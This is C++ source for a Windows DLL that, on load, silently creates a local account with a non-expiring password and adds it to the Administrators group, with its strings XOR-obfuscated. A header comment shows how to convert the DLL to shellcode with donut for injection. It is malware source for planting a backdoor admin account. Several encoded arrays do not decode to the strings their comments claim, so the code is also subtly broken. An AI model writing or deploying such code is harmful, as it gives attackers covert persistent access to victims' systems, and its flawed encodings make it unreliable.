// donut -f 1 -a 2 your.dll


#include <Windows.h>
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

// XOR key and encoded strings
const BYTE xor_key = 0x5A;

char encodedUser[]    = { '7','8','7','3','4','7', 0 };           // "adm1n" XORed with 0x5A
char encodedPass[]    = { '\x0A','\x1A','\x0A','\x0A','\x01','\x1D','\x13','\x16', 0 }; // "P@ssw0rd"
char encodedGroup[]   = { '\x1F','\x3F','\x3F','\x3B','\x24','\x30','\x36','\x2F','\x3A','\x2F','\x36','\x29','\x2C', 0 }; // "Administrators"

void Deobfuscate(char* str) {
    while (*str) {
        *str ^= xor_key;
        str++;
    }
}

extern "C" __declspec(dllexport) BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call != DLL_PROCESS_ATTACH)
        return TRUE;

    // Decode obfuscated strings
    Deobfuscate(encodedUser);
    Deobfuscate(encodedPass);
    Deobfuscate(encodedGroup);

    // Convert to wide strings
    wchar_t userW[256], passW[256], groupW[256];
    mbstowcs(userW, encodedUser, 256);
    mbstowcs(passW, encodedPass, 256);
    mbstowcs(groupW, encodedGroup, 256);

    // Add user
    USER_INFO_1 user = { 0 };
    user.usri1_name = userW;
    user.usri1_password = passW;
    user.usri1_priv = USER_PRIV_USER;
    user.usri1_flags = UF_DONT_EXPIRE_PASSWD;
    NetUserAdd(NULL, 1, (LPBYTE)&user, NULL);

    // Add to group
    LOCALGROUP_MEMBERS_INFO_3 member = { 0 };
    member.lgrmi3_domainandname = userW;
    NetLocalGroupAddMembers(NULL, groupW, 3, (LPBYTE)&member, 1);

    return TRUE;
}
